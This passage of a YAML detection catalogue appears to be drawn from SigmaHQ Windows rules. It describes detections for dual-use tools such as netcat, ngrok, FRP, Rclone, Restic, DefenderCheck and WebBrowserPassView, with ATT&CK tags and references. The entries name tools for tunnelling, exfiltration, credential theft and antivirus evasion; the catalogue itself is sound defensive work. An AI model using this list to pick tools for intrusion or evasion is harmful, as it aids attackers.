  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Reconnaissance
  techniques:
  - T1590.001
  tags:
  - attack.discovery
  - attack.reconnaissance
  - attack.t1590.001
  time_window: ''
  references:
  - https://github.com/vu-ls/Crassus
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d08a2711-ee8b-4323-bdec-b7d85e892b31
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_csexec.yml
  name: PUA - CsExec Execution
  description: Detects the use of the lesser known remote execution tool named CsExec
    a PsExec alternative
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  - T1587.001
  tags:
  - attack.resource-development
  - attack.t1587.001
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://github.com/malcomvetter/CSExec
  - https://www.microsoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f0ca6c24-3225-47d5-b1f5-352bf07ecfa7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_defendercheck.yml
  name: PUA - DefenderCheck Execution
  description: Detects the use of DefenderCheck, a tool to evaluate the signatures
    used in Microsoft Defender. It can be used to figure out the strings / byte chains
    used in Microsoft Defender to detect a tool and thus used for AV evasion.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027.005
  tags:
  - attack.defense-evasion
  - attack.t1027.005
  time_window: ''
  references:
  - https://github.com/matterpreter/DefenderCheck
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d3b70aad-097e-409c-9df2-450f80dc476b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_ditsnap.yml
  name: PUA - DIT Snapshot Viewer
  description: Detects the use of Ditsnap tool, an inspection tool for Active Directory
    database, ntds.dit.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.003
  time_window: ''
  references:
  - https://thedfirreport.com/2020/06/21/snatch-ransomware/
  - https://web.archive.org/web/20201124182207/https://github.com/yosqueoy/ditsnap
  false_positives:
  - Legitimate admin usage
  notes: ''
- detection_id: 32410e29-5f94-4568-b6a3-d91a8adad863
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_frp.yml
  name: PUA - Fast Reverse Proxy (FRP) Execution
  description: Detects the use of Fast Reverse Proxy. frp is a fast reverse proxy
    to help you expose a local server behind a NAT or firewall to the Internet.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.command-and-control
  - attack.t1090
  time_window: ''
  references:
  - https://asec.ahnlab.com/en/38156/
  - https://github.com/fatedier/frp
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: d7654f02-e04b-4934-9838-65c46f187ebc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_iox.yml
  name: PUA- IOX Tunneling Tool Execution
  description: Detects the use of IOX - a tool for port forwarding and intranet proxy
    purposes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.command-and-control
  - attack.t1090
  time_window: ''
  references:
  - https://github.com/EddieIvan01/iox
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: c9192ad9-75e5-43eb-8647-82a0a5b493e3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_mouselock_execution.yml
  name: PUA - Mouse Lock Execution
  description: In Kaspersky's 2020 Incident Response Analyst Report they listed legitimate
    tool "Mouse Lock" as being used for both credential access and collection in security
    incidents.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1056.002
  tags:
  - attack.credential-access
  - attack.collection
  - attack.t1056.002
  time_window: ''
  references:
  - https://github.com/klsecservices/Publications/blob/657deb6a6eb6e00669afd40173f425fb49682eaa/Incident-Response-Analyst-Report-2020.pdf
  - https://sourceforge.net/projects/mouselock/
  false_positives:
  - Legitimate uses of Mouse Lock software
  notes: ''
- detection_id: e31033fc-33f0-4020-9a16-faf9b31cbf08
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_netcat.yml
  name: PUA - Netcat Suspicious Execution
  description: Detects execution of Netcat. Adversaries may use a non-application
    layer protocol for communication between host and C2 server or among infected
    hosts within a network
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1095
  tags:
  - attack.command-and-control
  - attack.t1095
  time_window: ''
  references:
  - https://nmap.org/ncat/
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1095/T1095.md
  - https://www.revshells.com/
  false_positives:
  - Legitimate ncat use
  notes: ''
- detection_id: ca387a8e-1c84-4da3-9993-028b45342d30
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_netscan.yml
  name: PUA - SoftPerfect Netscan Execution
  description: 'Detects usage of SoftPerfect''s "netscan.exe". An application for
    scanning networks.

    It is actively used in-the-wild by threat actors to inspect and understand the
    network architecture of a victim.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1046
  tags:
  - attack.discovery
  - attack.t1046
  time_window: ''
  references:
  - https://www.protect.airbus.com/blog/uncovering-cyber-intruders-netscan/
  - https://secjoes-reports.s3.eu-central-1.amazonaws.com/Sockbot%2Bin%2BGoLand.pdf
  - https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/yanluowang-ransomware-attacks-continue
  - https://research.nccgroup.com/2022/07/13/climbing-mount-everest-black-byte-bytes-back/
  - https://www.bleepingcomputer.com/news/security/microsoft-exchange-servers-hacked-to-deploy-hive-ransomware/
  - https://www.softperfect.com/products/networkscanner/
  false_positives:
  - Legitimate administrator activity
  notes: ''
- detection_id: ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_ngrok.yml
  name: PUA - Ngrok Execution
  description: 'Detects the use of Ngrok, a utility used for port forwarding and tunneling,
    often used by threat actors to make local protected services publicly available.

    Involved domains are bin.equinox.io for download and *.ngrok.io for connections.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1572
  time_window: ''
  references:
  - https://ngrok.com/docs
  - https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html
  - https://stackoverflow.com/questions/42442320/ssh-tunnel-to-ngrok-and-initiate-rdp
  - https://www.virustotal.com/gui/file/58d21840d915aaf4040ceb89522396124c82f325282f805d1085527e1e2ccfa1/detection
  - https://cybleinc.com/2021/02/15/ngrok-platform-abused-by-hackers-to-deliver-a-new-wave-of-phishing-attacks/
  - https://twitter.com/xorJosh/status/1598646907802451969
  - https://www.softwaretestinghelp.com/how-to-use-ngrok/
  false_positives:
  - Another tool that uses the command line switches of Ngrok
  - Ngrok http 3978 (https://learn.microsoft.com/en-us/azure/bot-service/bot-service-debug-channel-ngrok?view=azure-bot-service-4.0)
  notes: ''
- detection_id: 74a12f18-505c-4114-8d0b-8448dd5485c6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_nimgrab.yml
  name: PUA - Nimgrab Execution
  description: Detects the usage of nimgrab, a tool bundled with the Nim programming
    framework and used for downloading files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/28d190330fe44de6ff4767fc400cc10fa7cd6540/atomics/T1105/T1105.md
  false_positives:
  - Legitimate use of Nim on a developer systems
  notes: ''
- detection_id: 4fd6b1c7-19b8-4488-97f6-00f0924991a3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_nimscan.yml
  name: PUA - NimScan Execution
  description: 'Detects usage of NimScan, a portscanner utility.

    In early 2025, adversaries were observed using this utility to scan for open ports
    on remote hosts in a compromised environment.

    This rule identifies the execution of NimScan based on the process image name
    and specific hash values associated with different versions of the tool.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1046
  tags:
  - attack.discovery
  - attack.t1046
  time_window: ''
  references:
  - https://x.com/cyberfeeddigest/status/1887041526397587859
  - https://github.com/elddy/NimScan
  false_positives:
  - Legitimate administrator activity
  notes: ''
- detection_id: 4e2ed651-1906-4a59-a78a-18220fca1b22
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_nircmd.yml
  name: PUA - NirCmd Execution
  description: Detects the use of NirCmd tool for command execution, which could be
    the result of legitimate administrative activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  - attack.s0029
  time_window: ''
  references:
  - https://www.nirsoft.net/utils/nircmd.html
  - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/
  - https://www.nirsoft.net/utils/nircmd2.html#using
  false_positives:
  - Legitimate use by administrators
  notes: ''
- detection_id: d9047477-0359-48c9-b8c7-792cedcdc9c4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_nircmd_as_system.yml
  name: PUA - NirCmd Execution As LOCAL SYSTEM
  description: Detects the use of NirCmd tool for command execution as SYSTEM user
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  - attack.s0029
  time_window: ''
  references:
  - https://www.nirsoft.net/utils/nircmd.html
  - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/
  - https://www.nirsoft.net/utils/nircmd2.html#using
  false_positives:
  - Legitimate use by administrators
  notes: ''
- detection_id: f6ecd1cf-19b8-4488-97f6-00f0924991a3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_nmap_zenmap.yml
  name: PUA - Nmap/Zenmap Execution
  description: Detects usage of namp/zenmap. Adversaries may attempt to get a listing
    of services running on remote hosts, including those that may be vulnerable to
    remote software exploitation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1046
  tags:
  - attack.discovery
  - attack.t1046
  time_window: ''
  references:
  - https://nmap.org/
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1046/T1046.md#atomic-test-3---port-scan-nmap-for-windows
  false_positives:
  - Legitimate administrator activity
  notes: ''
- detection_id: 68d37776-61db-42f5-bf54-27e87072d17e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_nps.yml
  name: PUA - NPS Tunneling Tool Execution
  description: Detects the use of NPS, a port forwarding and intranet penetration
    proxy server
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.command-and-control
  - attack.t1090
  time_window: ''
  references:
  - https://github.com/ehang-io/nps
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 771d1eb5-9587-4568-95fb-9ec44153a012
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_nsudo.yml
  name: PUA - NSudo Execution
  description: Detects the use of NSudo tool for command execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  - attack.s0029
  time_window: ''
  references:
  - https://web.archive.org/web/20221019044836/https://nsudo.m2team.org/en-us/
  - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/
  false_positives:
  - Legitimate use by administrators
  notes: ''
- detection_id: b1cb4ab6-ac31-43f4-adf1-d9d08957419c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_pingcastle.yml
  name: PUA - PingCastle Execution
  description: Detects the execution of PingCastle, a tool designed to quickly assess
    the Active Directory security level.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1595
  tags:
  - attack.reconnaissance
  - attack.t1595
  time_window: ''
  references:
  - https://github.com/vletoux/pingcastle
  - https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/
  - https://github.com/fengjixuchui/Start-ADEnum/blob/e237a739db98b6104427d833004836507da36a58/Functions/Start-ADEnum.ps1#L450
  - https://github.com/lkys37en/Start-ADEnum/blob/5b42c54215fe5f57fc59abc52c20487d15764005/Functions/Start-ADEnum.ps1#L680
  - https://github.com/projectHULK/AD_Recon/blob/dde2daba9b3393a9388cbebda87068972cc0bd3b/SecurityAssessment.ps1#L2699
  - https://github.com/802-1x/Compliance/blob/2e53df8b6e89686a0b91116b3f42c8f717dca820/Ping%20Castle/Get-PingCastle-HTMLComplianceReport.ps1#L8
  - https://github.com/EvotecIT/TheDashboard/blob/481a9ce8f82f2fd55fe65220ee6486bae6df0c9d/Examples/RunReports/PingCastle.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: b37998de-a70b-4f33-b219-ec36bf433dc0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_pingcastle_script_parent.yml
  name: PUA - PingCastle Execution From Potentially Suspicious Parent
  description: 'Detects the execution of PingCastle, a tool designed to quickly assess
    the Active Directory security level via a script located in a potentially suspicious
    or uncommon location.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1595
  tags:
  - attack.reconnaissance
  - attack.t1595
  time_window: ''
  references:
  - https://github.com/vletoux/pingcastle
  - https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/
  - https://github.com/fengjixuchui/Start-ADEnum/blob/e237a739db98b6104427d833004836507da36a58/Functions/Start-ADEnum.ps1#L450
  - https://github.com/lkys37en/Start-ADEnum/blob/5b42c54215fe5f57fc59abc52c20487d15764005/Functions/Start-ADEnum.ps1#L680
  - https://github.com/projectHULK/AD_Recon/blob/dde2daba9b3393a9388cbebda87068972cc0bd3b/SecurityAssessment.ps1#L2699
  - https://github.com/802-1x/Compliance/blob/2e53df8b6e89686a0b91116b3f42c8f717dca820/Ping%20Castle/Get-PingCastle-HTMLComplianceReport.ps1#L8
  - https://github.com/EvotecIT/TheDashboard/blob/481a9ce8f82f2fd55fe65220ee6486bae6df0c9d/Examples/RunReports/PingCastle.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 811e0002-b13b-4a15-9d00-a613fce66e42
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_process_hacker.yml
  name: PUA - Process Hacker Execution
  description: 'Detects the execution of Process Hacker based on binary metadata information
    (Image, Hash, Imphash, etc).

    Process Hacker is a tool to view and manipulate processes, kernel options and
    other low level options.

    Threat actors abused older vulnerable versions to manipulate system processes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Persistence
  techniques:
  - T1543
  - T1564
  - T1622
  tags:
  - attack.defense-evasion
  - attack.discovery
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1622
  - attack.t1564
  - attack.t1543
  time_window: ''
  references:
  - https://processhacker.sourceforge.io/
  - https://www.crowdstrike.com/blog/falcon-overwatch-report-finds-increase-in-ecrime/
  false_positives:
  - While sometimes 'Process Hacker is used by legitimate administrators, the execution
    of Process Hacker must be investigated and allowed on a case by case basis
  notes: ''
- detection_id: 5817e76f-4804-41e6-8f1d-5fa0b3ecae2d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_radmin.yml
  name: PUA - Radmin Viewer Utility Execution
  description: Detects the execution of Radmin which can be abused by an adversary
    to remotely control Windows machines
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1072
  tags:
  - attack.execution
  - attack.lateral-movement
  - attack.t1072
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1072/T1072.md
  - https://www.radmin.fr/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0c92f2e6-f08f-4b73-9216-ecb0ca634689
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_rcedit_execution.yml
  name: PUA - Potential PE Metadata Tamper Using Rcedit
  description: Detects the use of rcedit to potentially alter executable PE metadata
    properties, which could conceal efforts to rename system utilities for defense
    evasion.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  - T1027.005
  - T1036
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  - attack.t1036
  - attack.t1027.005
  - attack.t1027
  time_window: ''
  references:
  - https://security.stackexchange.com/questions/210843/is-it-possible-to-change-original-filename-of-an-exe
  - https://www.virustotal.com/gui/file/02e8e8c5d430d8b768980f517b62d7792d690982b9ba0f7e04163cbc1a6e7915
  - https://github.com/electron/rcedit
  false_positives:
  - Legitimate use of the tool by administrators or users to update metadata of a
    binary
  notes: ''
- detection_id: e37db05d-d1f9-49c8-b464-cee1a4b11638
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_rclone_execution.yml
  name: PUA - Rclone Execution
  description: Detects execution of RClone utility for exfiltration as used by various
    ransomwares strains like REvil, Conti, FiveHands, etc
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567.002
  tags:
  - attack.exfiltration
  - attack.t1567.002
  time_window: ''
  references:
  - https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/
  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware
  - https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a
  - https://labs.sentinelone.com/egregor-raas-continues-the-chaos-with-cobalt-strike-and-rclone
  - https://www.splunk.com/en_us/blog/security/darkside-ransomware-splunk-threat-update-and-detections.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6ddff2e8-ea1a-45d0-8938-93dfc1d67ae7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_restic.yml
  name: PUA - Restic Backup Tool Execution
  description: 'Detects the execution of the Restic backup tool, which can be used
    for data exfiltration.

    Threat actors may leverage Restic to back up and exfiltrate sensitive data to
    remote storage locations, including cloud services.

    If not legitimately used in the enterprise environment, its presence may indicate
    malicious activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048
  - T1567.002
  tags:
  - attack.exfiltration
  - attack.t1048
  - attack.t1567.002
  time_window: ''
  references:
  - https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/#exfiltration
  - https://restic.net/
  - https://restic.readthedocs.io/en/stable/030_preparing_a_new_repo.html
  false_positives:
  - Legitimate use of Restic for backup purposes within the organization.
  notes: ''
- detection_id: 93199800-b52a-4dec-b762-75212c196542
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_runxcmd.yml
  name: PUA - RunXCmd Execution
  description: Detects the use of the RunXCmd tool to execute commands with System
    or TrustedInstaller accounts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  - attack.s0029
  time_window: ''
  references:
  - https://www.d7xtech.com/free-software/runx/
  - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/
  false_positives:
  - Legitimate use by administrators
  notes: ''
- detection_id: 38646daa-e78f-4ace-9de0-55547b2d30da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_seatbelt.yml
  name: PUA - Seatbelt Execution
  description: Detects the execution of the PUA/Recon tool Seatbelt via PE information
    of command line parameters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  - T1087
  - T1526
  tags:
  - attack.discovery
  - attack.t1526
  - attack.t1087
  - attack.t1083
  time_window: ''
  references:
  - https://github.com/GhostPack/Seatbelt
  - https://www.bluetangle.dev/2022/08/fastening-seatbelt-on-threat-hunting.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 5722dff1-4bdd-4949-86ab-fbaf707e767a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_system_informer.yml
  name: PUA - System Informer Execution
  description: Detects the execution of System Informer, a task manager tool to view
    and manipulate processes, kernel options and other low level operations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Persistence
  techniques:
  - T1082
  - T1543
  - T1564
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.discovery
  - attack.defense-evasion
  - attack.t1082
  - attack.t1564
  - attack.t1543
  time_window: ''
  references:
  - https://github.com/winsiderss/systeminformer
  false_positives:
  - System Informer is regularly used legitimately by system administrators or developers.
    Apply additional filters accordingly
  notes: ''
- detection_id: 44030449-b0df-4c94-aae1-502359ab28ee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_trufflehog.yml
  name: PUA - TruffleHog Execution
  description: 'Detects execution of TruffleHog, a tool used to search for secrets
    in different platforms like Git, Jira, Slack, SharePoint, etc. that could be used
    maliciously.

    While it is a legitimate tool, intended for use in CI pipelines and security assessments,

    It was observed in the Shai-Hulud malware campaign targeting npm packages to steal
    sensitive information.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  - T1552.001
  tags:
  - attack.discovery
  - attack.credential-access
  - attack.t1083
  - attack.t1552.001
  time_window: ''
  references:
  - https://github.com/trufflesecurity/trufflehog
  - https://www.getsafety.com/blog-posts/shai-hulud-npm-attack
  false_positives:
  - Legitimate use of TruffleHog by security teams or developers.
  notes: ''
- detection_id: d0dae994-26c6-4d2d-83b5-b3c8b79ae513
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_webbrowserpassview.yml
  name: PUA - WebBrowserPassView Execution
  description: Detects the execution of WebBrowserPassView.exe. A password recovery
    tool that reveals the passwords stored by the following Web browsers, Internet
    Explorer (Version 4.0 - 11.0), Mozilla Firefox (All Versions), Google Chrome,
    Safari, and Opera
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1555.003
  tags:
  - attack.credential-access
  - attack.t1555.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1555.003/T1555.003.md
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: bdeeabc9-ff2a-4a51-be59-bb253aac7891
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_wsudo_susp_execution.yml
  name: PUA - Wsudo Suspicious Execution
  description: Detects usage of wsudo (Windows Sudo Utility). Which is a tool that
    let the user execute programs with different permissions (System, Trusted Installer,
    Administrator...etc)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.privilege-escalation
  - attack.t1059
  time_window: ''
  references:
  - https://github.com/M2Team/Privexec/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160
